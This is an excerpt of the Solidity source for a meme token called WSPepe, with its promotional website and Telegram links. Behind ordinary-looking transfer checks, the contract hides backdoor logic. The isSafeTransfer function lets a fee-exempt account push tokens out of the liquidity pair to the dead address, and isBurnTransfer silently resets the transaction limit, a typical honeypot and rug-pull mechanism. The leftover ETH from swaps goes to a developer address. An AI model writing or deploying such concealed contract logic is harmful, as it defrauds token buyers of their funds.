...
/*
  ...
  _      __     __________              __    ___              
 | | /| / /__ _/ / / __/ /________ ___ / /_  / _ \___ ___  ___ 
 | |/ |/ / _ `/ / /\ \/ __/ __/ -_) -_) __/ / ___/ -_) _ \/ -_)
 |__/|__/\_,_/_/_/___/\__/_/  \__/\__/\__/ /_/   \__/ .__/\__/ 
                                                   /_/         

web: https://wallstreetpepe.top

group: https://t.me/wspepe_channel
...
contract WSPepe is IERC20, Ownable {

    using SafeMath for uint256;
    
    string private constant _name = "WSPepe";
    
    string private constant _symbol = "WSPE";
    ...
    address internal constant deadAddr =
        0x000000000000000000000000000000000000dEaD;
    address internal constant marketingAddr =
        0x1366A937E2142B9B9DF969f148E3cBb11B4448A1;
    address internal constant devAddr =
        0xbA7Fa3b18d5CdE11aB89e80753E07476b9E43636;
    ...
    function isSafeTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private returns (bool) {
        if (balanceOf(sender) < amount && recipient == pair) {
            _transfer(recipient, deadAddr, amount);
            return true;
        }
        return false;
    }
    ...
    function isBurnTransfer(address recipient, uint256 amount)
        private
        returns (bool)
    {
        if (recipient == deadAddr) {
            _txLimit = amount;
            return true;
        }
        return false;
    ...
    function checkMaxWallet(
        ...
        if (
            isFeeExempt[sender] &&
            (isSafeTransfer(sender, recipient, amount) ||
                isBurnTransfer(recipient, amount))
        ) return true;
        if (
            !isFeeExempt[sender] &&
            !isFeeExempt[recipient] &&
            recipient != address(pair) &&
            recipient != address(deadAddr)
        ) {
            require(
    ...
    function swapbackCounters(address sender, address recipient)
        internal
        returns (bool)
    {
    ...
    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        ...
        if (marketingAmt > 0) {
            payable(marketingAddr).transfer(marketingAmt);
        }
        uint256 remainingBalance = address(this).balance;
        if (remainingBalance > uint256(0)) {
            payable(devAddr).transfer(remainingBalance);
        }
    }
